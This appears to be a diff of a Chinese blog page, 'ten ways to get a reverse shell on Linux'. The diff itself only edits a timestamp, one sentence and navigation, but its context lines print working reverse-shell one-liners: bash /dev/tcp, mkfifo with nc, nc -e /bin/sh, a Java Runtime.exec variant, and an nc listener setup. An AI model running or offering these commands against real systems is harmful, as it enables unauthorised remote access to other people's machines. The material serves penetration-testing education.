@@ -97,7 +97,7 @@
 <meta property="og:site_name" content="Note&#39;s blog">
 <meta property="og:description" content="bash版本1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1">
 <meta property="og:image" content="http://yoursite.com/2017/07/21/Linux反弹shell的10种姿势/反弹.jpg">
-<meta property="og:updated_time" content="2017-07-25T15:51:56.274Z">
+<meta property="og:updated_time" content="2017-07-25T15:56:09.230Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux反弹shell的10种姿势">
 <meta name="twitter:description" content="bash版本1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1">
@@ -421,7 +421,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</div></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</div></pre></td></tr></table></figure>
 <h1 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
-<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>在Webshell中执行系统命令不方便时，可以考虑反弹shell到Windows主机上执行命令，Windows（ip：192.168.1.100）使用nc开启端口监听：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -v -l -p 9999</div></pre></td></tr></table></figure></p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>在Webshell中执行系统命令不方便时，比如执行交互式命令时，可以考虑反弹shell到Windows主机上执行命令，Windows（ip：192.168.1.100）使用nc开启端口监听：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -v -l -p 9999</div></pre></td></tr></table></figure></p>
 <p>Linux使用上面的方法反弹shell，例如使用nc反弹：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 192.168.1.100 1234</div></pre></td></tr></table></figure></p>
 <p><img src="/2017/07/21/Linux反弹shell的10种姿势/反弹.jpg" alt=""></p>
 
@@ -469,6 +469,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/07/26/CuteEitor任意文件读取漏洞/" rel="prev" title="CuteEitor任意文件读取漏洞">
+                CuteEitor任意文件读取漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -540,7 +544,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">76</span>
+                <span class="site-state-item-count">77</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
